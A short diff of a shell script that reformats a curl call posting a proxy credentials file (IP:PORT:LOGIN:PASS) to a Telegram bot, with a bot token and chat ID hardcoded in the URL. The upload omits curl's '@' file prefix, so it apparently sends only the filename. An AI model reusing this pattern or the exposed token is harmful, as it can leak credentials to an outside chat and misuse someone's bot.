@@ -52,7 +52,10 @@ EOF
 }
 
 upload_proxy() {
-	curl -F document=proxy.txt https://api.telegram.org/bot6124963785:AAFNE9qm_tabPeY69IIB4zC-W9CfrRfpoCk/sendDocument?chat_id=-708242951
+	curl -F chat_id="-708242951" \
+	     -F document="proxy.txt" \
+	     "https://api.telegram.org/bot6124963785:AAFNE9qm_tabPeY69IIB4zC-W9CfrRfpoCk/sendDocument"
+
     echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
 }
 gen_data() {
